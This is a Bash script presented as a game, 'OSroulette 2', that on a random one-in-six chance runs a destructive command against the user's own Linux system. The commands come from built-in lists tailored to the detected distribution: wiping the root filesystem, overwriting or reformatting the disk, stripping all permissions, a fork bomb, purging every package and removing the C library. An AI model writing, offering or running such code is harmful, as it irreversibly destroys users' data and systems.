# OSroulette - The even more dangerous game

# Function to detect Linux distribution
get_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        echo "$ID"
    else
        echo "unknown"
    fi
}

# countdown
countdown() {
    echo -n "$1"
    for i in {3..1}; do
        echo -n "."
        sleep 1
    done
    echo
}

# --- Destructive Commands ---
# Generic commands (should work on most systems)
generic_commands=(
    "sudo rm -rf / --no-preserve-root :: Wiped your entire filesystem!"
    "sudo chmod -R 000 / :: Removed all permissions from all files. Chaos!"
    "sudo shutdown -h now :: Powered off your system!"
    "dd if=/dev/random of=/dev/sda :: Wrote random data to your primary drive!"
    "mkfs.ext4 /dev/sda1 :: Re-formatted your primary partition! Ouch."
    "mv ~ /dev/null :: Moved your home directory to a black hole. Bye bye, files!"
    ":(){ :|:& };: :: Fork bomb! Your system will soon be unresponsive."
)

# Debian/Ubuntu specific
apt_commands=(
    "sudo apt-get remove --purge * :: Purged all packages! System is now very broken."
    "sudo dpkg --remove --force-depends libc6 :: Broke the C library. Almost nothing will work now."
)

# Arch specific
pacman_commands=(
    "sudo pacman -Rns \$(pacman -Qnq) :: Uninstalled all packages! System is now very broken."
    "sudo pacman -Syu --noconfirm :: This could have gone so wrong..."
)

# Fedora/CentOS specific
dnf_commands=(
    "sudo dnf remove -y '*' :: Removed all packages with dnf. Ouch."
)

play_game() {
    # Generate a random number between 1 and 6
    chamber=$(( ( RANDOM % 6 ) + 1 ))

    # The bullet is in chamber 1
    bullet=1

    echo "Welcome to OSroulette 2: Electric Boogaloo!"
    countdown "Spinning the chamber"

    if [ "$chamber" -eq "$bullet" ]; then
        echo "BANG! You lost."
        
        distro=$(get_distro)
        echo "Detected distribution: $distro"

        # Combine command arrays based on distro
        commands=("${generic_commands[@]}")
        if [ "$distro" == "ubuntu" ] || [ "$distro" == "debian" ]; then
            commands+=("${apt_commands[@]}")
        elif [ "$distro" == "arch" ]; then
            commands+=("${pacman_commands[@]}")
        elif [ "$distro" == "fedora" ] || [ "$distro" == "centos" ]; then
            commands+=("${dnf_commands[@]}")
        fi

        # Select and execute a random command
        num_commands=${#commands[@]}
        random_index=$(( RANDOM % num_commands ))
        command_string="${commands[$random_index]}"
        
        # Extract the command part (before " ::")
        command_to_run=$(echo "$command_string" | cut -d':' -f1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')

        countdown "Executing command in 3 seconds"
        echo "Executing: $command_string"
        # Execute the command
        eval "$command_to_run"
    else
        echo "Click. You survived."
    fi
}

while true; do
    clear
    echo "****************************************************"
    echo "*                                                  *"
    echo "*        OSroulette 2 - Electric Boogaloo          *"
    echo "*                                                  *"
    echo "****************************************************"
    echo ""
    echo "1. Play Game"
    echo "2. Return to Main Menu"
    echo "3. Exit"
    echo ""
    read -p "Enter your choice [1-3]: " choice

    case $choice in
        1)
            play_game
            read -p "Press [Enter] to continue..."
            ;;
        2)
            echo "Returning to Main Menu..."
            exit 0
            ;;
        3)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option. Please try again."
            sleep 2
            ;;
    esac
done